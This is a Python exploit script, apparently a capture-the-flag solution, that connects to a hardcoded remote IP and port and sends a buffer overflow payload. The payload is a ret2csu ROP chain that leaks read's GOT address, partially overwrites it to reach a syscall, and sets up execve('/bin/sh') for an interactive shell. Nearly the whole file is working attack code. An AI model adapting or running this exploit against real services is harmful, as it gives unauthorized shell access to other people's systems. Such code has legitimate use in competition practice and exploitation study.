#!/usr/bin/env python
# -*- coding: utf-8 -*-
__author__ = 'ByStudent'
from zio import *
target = "./qwb3"
target = ("106.75.8.230", 19286)
def get_io(target):
    r_m = COLORED(RAW, "green")
    w_m = COLORED(RAW, "blue")
    io = zio(target, timeout=3, print_read=r_m, print_write=w_m)
    return io
def pwn(io, offset):
    io.read_until(" \n")
    write_got = 0x0000000000601018
    read_got = 0x0000000000601020
    offset_write = 0xeb590
    offset_read = 0xeb530
    write_plt = 0x0000000000400450
    read_plt = 0x0000000000400460
    set_args_addr = 0x40062a
    call_func_addr = 0x400610
    payload = ""
    payload += l64(set_args_addr)
    payload += l64(0)  # pop rbx = 0
    payload += l64(1)  # pop rbp
    payload += l64(write_got)  # pop r12
    payload += l64(8)  # pop r13
    payload += l64(read_got)  # pop r14
    payload += l64(1)  # pop r15
    payload += l64(call_func_addr)
    """
    payload += l64(0)            #nouse padding : add     rsp, 8
    payload += l64(0)            #pop rbx = 0
    payload += l64(1)            #pop rbp
    payload += l64(read_got)     #pop r12
    payload += l64(8)         #pop r13
    payload += l64(read_got+8)         #pop r14
    payload += l64(0)         #pop r15
    payload += l64(call_func_addr)
    """
    payload += l64(0)  # nouse padding :add     rsp, 8
    payload += l64(0)  # pop rbx = 0
    payload += l64(1)  # pop rbp
    payload += l64(read_got)  # pop r12
    payload += l64(0x3b)  # pop r13
    payload += l64(read_got)  # pop r14
    payload += l64(0)  # pop r15
    payload += l64(call_func_addr)
    payload += l64(0)  # nouse padding :add     rsp, 8
    payload += l64(0)  # pop rbx = 0
    payload += l64(1)  # pop rbp
    payload += l64(read_got)  # pop r12
    payload += l64(0)  # pop r13
    payload += l64(0)  # pop r14
    payload += l64(read_got + 8)  # pop r15
    payload += l64(call_func_addr)
    shellcode = ""
    shellcode += 'a' * 0x40
    shellcode += l64(0x01)
    shellcode += payload
    io.writeline(shellcode)
    data = io.read(8)
    read_addr = l64(data)
    #io.write("/bin/sh;")
    # io.gdb_hint()
    io.write((l64((read_addr & 0xffffffffffffff00) + offset) + "/bin/sh\x00").ljust(0x3b, 'a'))
    # offset_system =0x44c40
    # libc_base = read_addr - offset_read
    # system_addr = libc_base +offset_system
    io.interact()
offset = 0xbe
# """
io = get_io(target)
pwn(io, offset)
exit(0)
